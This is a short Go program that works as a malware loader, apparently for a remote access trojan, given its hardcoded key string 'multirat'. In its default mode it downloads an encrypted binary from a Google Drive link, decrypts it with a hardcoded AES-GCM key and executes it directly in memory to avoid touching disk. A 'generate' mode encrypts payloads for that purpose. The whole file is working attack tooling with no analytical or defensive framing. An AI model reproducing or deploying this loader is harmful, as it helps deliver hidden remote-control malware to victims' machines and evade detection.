package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"github.com/amenzhinsky/go-memexec"
)

var key = []byte("multiratEYFQwTVRqgdwnvUCAVdXCcER")

func main() {
	cipherKey := key
	aesCipher, err := aes.NewCipher(cipherKey)
	if err != nil {
		log.Fatal(err)
	}

	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		log.Fatal(err)
	}

	if len(os.Args) == 3 && os.Args[1] == "generate" {
		generatePayload(gcm, os.Args[2])
		return
	}

	binaryData, err := downloadBinary()
	if err != nil {
		log.Fatal(err)
	}

	decryptedData, err := decryptBinary(gcm, binaryData)
	if err != nil {
		log.Fatal(err)
	}

	exe, err := memexec.New(decryptedData)
	if err != nil {
		log.Fatal(err)
	}
	defer exe.Close()

	output, err := exe.Command().Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(output))
}

func generatePayload(gcm cipher.AEAD, fileName string) {
	contents, err := os.ReadFile(fileName)
	if err != nil {
		log.Fatal(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err)
	}

	encryptedContents := gcm.Seal(nil, nonce, contents, nil)

	err = os.WriteFile(fileName+".bin", append(nonce, encryptedContents...), 0777)
	if err != nil {
		log.Fatal(err)
	}
}

func downloadBinary() ([]byte, error) {
	resp, err := http.Get("https://drive.google.com/uc?export=download&id=1z1E59sJu8v19HoVPHdVaQ8QrF8a2kKRU")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func decryptBinary(gcm cipher.AEAD, binaryData []byte) ([]byte, error) {
	nonceSize := gcm.NonceSize()
	nonce, encryptedData := binaryData[:nonceSize], binaryData[nonceSize:]
	return gcm.Open(nil, nonce, encryptedData, nil)
}
